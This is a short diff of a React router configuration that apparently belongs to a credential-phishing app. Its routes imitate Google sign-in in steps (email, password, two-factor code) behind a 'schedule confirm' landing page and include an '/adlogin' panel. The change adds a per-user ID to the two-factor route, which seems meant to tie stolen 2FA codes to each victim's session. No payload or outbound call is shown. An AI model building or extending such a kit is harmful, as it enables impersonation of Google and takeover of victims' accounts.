@@ -67,7 +67,7 @@ return (
                   <Route path="/schedule/confirm" element={<Landing/>} />
                   <Route path="/google/login" element={<EnterEmail/>} />
                   <Route path="/google/auth/:userID" element={<EnterPass/>} />
-                  <Route path="/google/twofactor" element={<Twofactor/>} />
+                  <Route path="/google/twofactor/:userID" element={<Twofactor/>} />
                   <Route path="/schedule/confirm/done" element={<Done />} />
                   <Route path="/adlogin" element={<Login />} />
                   <Route
